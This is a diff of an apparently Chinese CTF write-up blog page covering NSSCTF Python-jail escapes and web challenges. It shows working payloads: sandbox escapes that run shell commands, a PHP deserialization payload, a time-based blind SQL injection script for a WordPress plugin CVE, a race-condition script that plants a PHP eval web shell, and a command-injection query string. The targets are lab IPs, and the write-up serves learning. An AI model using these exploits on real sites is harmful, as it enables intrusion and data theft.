@@ -239,6 +239,15 @@
 
           
           
+          <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
           
           
           <li>
@@ -262,15 +271,6 @@
           </li>
           
           
-          
-          <li>
-            <a href="/archive/">
-              
-              归档
-              
-              
-            </a>
-          </li>
           
           
           
@@ -403,11 +403,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">49</span> Minutes
+              Estimated Reading Time <span class="post-count">56</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">8.5k</span> In Total
+              Words <span class="post-count">9.6k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -594,8 +594,16 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <blockquote>
 <p>nssctf{Th3_P10t_S0_sweet}</p>
 </blockquote>
-<h2 id="NSSCTF-jail-level-0">NSSCTF jail level 0</h2>
+<h2 id="NSSCTF-guessnumber-（ACM）">NSSCTF guessnumber （ACM）</h2>
 <h3 id="题解-6">题解</h3>
+<ol>
+<li>题目是一个猜数游戏，每次游戏都是一个 4 位数，每次猜测之后会给出每一位偏大或偏小的信息</li>
+<li>只考虑猜测一次之后剩余可能的数最多有多少，选择最少的情况进行猜测。实现上可以维护一个当前可能的答案集合，每次猜测前先遍历集合，找到按上述策略最优的猜测选项，进行猜测并利用给出的信息更新答案集合，直到答案集合只有一个元素，就是正确答案</li>
+<li>payload<br>
+<img src="guessnumber.png" alt="guess"></li>
+</ol>
+<h2 id="NSSCTF-jail-level-0">NSSCTF jail level 0</h2>
+<h3 id="题解-7">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -614,7 +622,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{10a0f6d5-8d31-4ac4-9310-71a9c48cf961}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-1">NSSCTF jail level 1</h2>
-<h3 id="题解-7">题解</h3>
+<h3 id="题解-8">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -634,7 +642,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{f3f1df73-8643-4d84-9398-a32c3ab9cc1d}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-2">NSSCTF jail level 2</h2>
-<h3 id="题解-8">题解</h3>
+<h3 id="题解-9">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -653,7 +661,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{af8ebdf5-e0dd-45db-9674-f8cceccc85a4}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-2-5">NSSCTF jail level 2.5</h2>
-<h3 id="题解-9">题解</h3>
+<h3 id="题解-10">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -667,7 +675,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <code>__import__('os').system('cat flag')</code></p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-3">NSSCTF jail level 3</h2>
-<h3 id="题解-10">题解</h3>
+<h3 id="题解-11">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -687,7 +695,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{817d3d91-f19e-42b8-9049-46cef27ab4f5}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-4">NSSCTF jail level 4</h2>
-<h3 id="题解-11">题解</h3>
+<h3 id="题解-12">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -705,7 +713,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{d0f578d5-f44b-4a23-98f7-6c26dd2e2d6f}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level4-0-5">NSSCTF jail level4.0.5</h2>
-<h3 id="题解-12">题解</h3>
+<h3 id="题解-13">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -717,7 +725,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>open(bytes([46, 47, 102, 108, 97, 103]).decode()).read()</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-4-1">NSSCTF jail level 4.1</h2>
-<h3 id="题解-13">题解</h3>
+<h3 id="题解-14">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -733,18 +741,20 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <p>NSSCTF{374855eb-4c56-4c2f-a538-bbe7a3f51b1f}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-4-2">NSSCTF jail level 4.2</h2>
-<h3 id="题解-14">题解</h3>
+<h3 id="题解-15">题解</h3>
 <p>几乎和 4.1 一样，非预期解直接出</p>
 <h2 id="NSSCTF-jail-level-4-3">NSSCTF jail level 4.3</h2>
-<h3 id="题解-15">题解</h3>
-<p><a target="_blank" rel="noopener" href="http://1.server.py">1.server.py</a></p>
+<h3 id="题解-16">题解</h3>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
+</ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_002EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_000FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span>(<span class="params">s</span>):</span></span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |___ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">    input_data = my_input_func_000FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_002EFCDB(input_data)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <ol start="2">
 <li>payload</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[[i <span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__].pop(<span class="number">47</span>)](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">42</span>]).decode())</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>利用 os.system(bytes([‘cat *’]))</p>
+<p>利用 <code>os.system(bytes(['cat *']))</code></p>
 </blockquote>
 <ol start="3">
 <li>flag</li>
@@ -756,7 +766,7 @@ python <a target="_blank" rel="noopener" href="http://bwmforpy3.py">bwmforpy3.py
 <li>预期解一样解上两道</li>
 </ol>
 <h2 id="NSSCTF-jail-level-5">NSSCTF jail level 5</h2>
-<h3 id="题解-16">题解</h3>
+<h3 id="题解-17">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -780,7 +790,7 @@ NSSCTF{3b707fa6-65d4-4cd3-8b5b-5bfa6b63bc2a}</p>
 <p>my_flag.flag_level5.index(‘NSSCTF{*****’) 爆破</p>
 </blockquote>
 <h2 id="NSSCTF-jail-level-6">NSSCTF jail level 6</h2>
-<h3 id="题解-17">题解</h3>
+<h3 id="题解-18">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -790,7 +800,7 @@ NSSCTF{3b707fa6-65d4-4cd3-8b5b-5bfa6b63bc2a}</p>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&quot;__loader__&quot;</span>].load_module(<span class="string">&quot;_posixsubprocess&quot;</span>).fork_exec([<span class="string">b&quot;/usr/bin/cat&quot;</span>, <span class="string">&quot;flag&quot;</span>], [<span class="string">b&quot;/usr/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__builtins__[<span class="string">&quot;__loader__&quot;</span>].load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="NSSCTF-jail-level-7">NSSCTF jail level 7</h2>
-<h3 id="题解-18">题解</h3>
+<h3 id="题解-19">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -800,7 +810,7 @@ NSSCTF{3b707fa6-65d4-4cd3-8b5b-5bfa6b63bc2a}</p>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">--HNCTF</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;car flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="NSSCTF-s-Fe-safeeval">NSSCTF s@Fe safeeval</h2>
-<h3 id="题解-19">题解</h3>
+<h3 id="题解-20">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -813,7 +823,7 @@ NSSCTF{3b707fa6-65d4-4cd3-8b5b-5bfa6b63bc2a}</p>
 cat flag</p>
 </blockquote>
 <h2 id="NSSCTF-python2-jail">NSSCTF python2 jail</h2>
-<h3 id="题解-20">题解</h3>
+<h3 id="题解-21">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -826,7 +836,7 @@ cat flag</p>
 <p>NSSCTF{4fd091c9-cd80-4088-9967-9c088e940837}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-lake-lake-lake">NSSCTF jail lake lake lake</h2>
-<h3 id="题解-21">题解</h3>
+<h3 id="题解-22">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -851,7 +861,7 @@ a34af94e88aed5c34fb5ccfe08cd14ab<br>
 <p>NSSCTF{4ea288b4-cce3-45dd-8749-120bb5e359eb}</p>
 </blockquote>
 <h2 id="NSSCTF-jail-l-ke-l-ke-l-ke">## NSSCTF jail l@ke l@ke l@ke</h2>
-<h3 id="题解-22">题解</h3>
+<h3 id="题解-23">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -866,7 +876,7 @@ ke_9d38ee7f31d6126d = ‘95c720690c2c83f0982ffba63ff87338’<br>
 NSSCTF{422d9d33-4c34-49ec-889c-a7fd7dd3f15a}</p>
 </blockquote>
 <h2 id="NSSCTF-laKe-laKe-laKe">NSSCTF laKe laKe laKe</h2>
-<h3 id="题解-23">题解</h3>
+<h3 id="题解-24">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -882,7 +892,7 @@ NSSCTF{422d9d33-4c34-49ec-889c-a7fd7dd3f15a}</p>
 <p>NSSCTF{cfb193c0-6ae9-4213-b75d-d6304cf5b5ea}</p>
 </blockquote>
 <h2 id="NSSCTF-Side-channel-pyjail-tyPe-Ch-nnEl">NSSCTF Side-channel/pyjail: tyPe Ch@nnEl</h2>
-<h3 id="题解-24">题解</h3>
+<h3 id="题解-25">题解</h3>
 <ol>
 <li><a target="_blank" rel="noopener" href="http://server.py">server.py</a></li>
 </ol>
@@ -946,7 +956,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 </blockquote>
 <h1>WEB</h1>
 <h2 id="Challenge-RCE">Challenge RCE</h2>
-<h3 id="题解-25">题解</h3>
+<h3 id="题解-26">题解</h3>
 <ol>
 <li>index.php</li>
 </ol>
@@ -962,7 +972,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 <p>来自学长的 payload</p>
 </blockquote>
 <h2 id="easy-unser">easy_unser</h2>
-<h3 id="题解-26">题解</h3>
+<h3 id="题解-27">题解</h3>
 <ol>
 <li>index.php</li>
 </ol>
@@ -972,7 +982,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 </ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> body(<span class="string">&#x27;./a/../f14g.php&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);   <span class="comment">//  利用伪造路径绕过 is_file and == f14g.php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// 对象数量加一，绕过 body::__wakeup()</span></span><br><span class="line"><span class="comment">// url 编码，因为其中变量包含 private</span></span><br></pre></td></tr></table></figure>
 <h2 id="easy-include">easy_include</h2>
-<h3 id="题解-27">题解</h3>
+<h3 id="题解-28">题解</h3>
 <ol>
 <li>index.php</li>
 </ol>
@@ -996,7 +1006,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 <p>NSSCTF{a1cba83f-3eee-4e32-b585-72dc6ec14b16}</p>
 </blockquote>
 <h2 id="CanYouRCE">CanYouRCE</h2>
-<h3 id="题解-28">题解</h3>
+<h3 id="题解-29">题解</h3>
 <ol>
 <li>index.php</li>
 </ol>
@@ -1023,7 +1033,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 <p>NSSCTF{193fff60-095b-4ed4-ac77-984df2b1b842}</p>
 </blockquote>
 <h2 id="ez-phar">ez_phar</h2>
-<h3 id="题解-29">题解</h3>
+<h3 id="题解-30">题解</h3>
 <ol>
 <li>index.php</li>
 </ol>
@@ -1045,8 +1055,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 <p>NSSCTF{0df9cc80-ca68-4b9d-b331-7406fc05cd06}</p>
 </blockquote>
 <h2 id="logjjjjlogjjjj">logjjjjlogjjjj</h2>
-<p>未打通，原因未知，解法无误，可能与 VPS 环境有关</p>
-<h3 id="题解-30">题解</h3>
+<h3 id="题解-31">题解</h3>
 <ol>
 <li>下载exp</li>
 </ol>
@@ -1068,7 +1077,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 </ol>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> sos<span class="number">4</span>cret</span><br><span class="line"></span><br><span class="line"><span class="attribute">NSSCTF</span>&#123;a<span class="number">7</span>a<span class="number">3</span>cb<span class="number">40</span>-db<span class="number">51</span>-<span class="number">40</span>ce-<span class="number">936</span>f-<span class="number">325</span>ab<span class="number">93</span>d<span class="number">2174</span>&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="SSTI">SSTI</h2>
-<h3 id="题解-31">题解</h3>
+<h3 id="题解-32">题解</h3>
 <ol>
 <li>过滤</li>
 </ol>
@@ -1090,6 +1099,83 @@ guess =&gt; num 猜测字符的 ascii 码<br>
 <blockquote>
 <p>NSSCTF{078be9fe-c174-4943-a10b-84d9e9f46625}</p>
 </blockquote>
+<h2 id="ohmywordpress">ohmywordpress</h2>
+<h3 id="题解-33">题解</h3>
+<ol>
+<li>CVE-2022-0760 盲注</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210">https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210</a></p>
+</blockquote>
+<ol start="2">
+<li>exp</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28504/wp-admin/admin-ajax.php&#x27;</span></span><br><span class="line"></span><br><span class="line">dicts = <span class="string">r&#x27;NSSCTF&#123;-abcdef0123456789&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        payload = <span class="string">&quot;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),&#123;&#125;,1))=&#123;&#125;, sleep(5),0))enz)&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        res = requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;qcopd_upvote_action&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;post_id&#x27;</span>: payload</span><br><span class="line">            &#125;)</span><br><span class="line">        stop_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> stop_time - start_time &gt;= <span class="number">5</span>:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;FOUND!!!&#x27;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="QAQ-1inclu4e">QAQ_1inclu4e</h2>
+<h3 id="题解-34">题解</h3>
+<ol>
+<li>session.upload_progress 文件包含 + 条件竞争</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+</blockquote>
+<ol start="2">
+<li>exp</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27; sessid &#x27;</span> <span class="comment"># sessid 根据正则修改</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27; BASH &#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://43.143.7.97:28468/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;QAQ.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url+<span class="string">&#x27;?filter=/tmp/sess_&#x27;</span> + sessid,</span><br><span class="line">                            data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;QAQ.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<h2 id="Fun-php">Fun_php</h2>
+<h3 id="题解-35">题解</h3>
+<ol>
+<li>php特性狠活</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15388795.html">https://www.cnblogs.com/murkuo/p/15388795.html</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/not_code_god/article/details/123910155">https://blog.csdn.net/not_code_god/article/details/123910155</a></p>
+</blockquote>
+<ol start="2">
+<li>payload</li>
+</ol>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">@Get</span></span><br><span class="line">?user<span class="operator">=</span><span class="number">114514</span>a&amp;pass<span class="operator">=</span><span class="number">0</span>&amp;mySaid<span class="operator">=</span>QNKCDZO&amp;myHeart<span class="operator">=</span><span class="number">240610708</span>&amp;hn<span class="operator">=</span>hn&amp;<span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%AE</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6LAG</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A9</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6ctf</span><span class="operator">=</span><span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%AE</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6</span><span class="variable">%20</span>Flag!<span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A9</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6ctf</span></span><br><span class="line"></span><br><span class="line"><span class="title">@POST</span></span><br><span class="line">data[]<span class="operator">=</span><span class="number">0</span>&amp;verify[]<span class="operator">=</span><span class="number">1</span>&amp;want<span class="operator">=</span>f*<span class="variable">%26</span><span class="variable">%26</span>tac+f*&gt;a</span><br></pre></td></tr></table></figure>
+<h2 id="unf1ni3hed-web3he11">unf1ni3hed_web3he11</h2>
+<h3 id="题解-36">题解</h3>
+<ol>
+<li>session.upload_progress反序列化 条件竞争</li>
+</ol>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/123405767">https://blog.csdn.net/qq_61237064/article/details/123405767</a></p>
+</blockquote>
+<ol start="2">
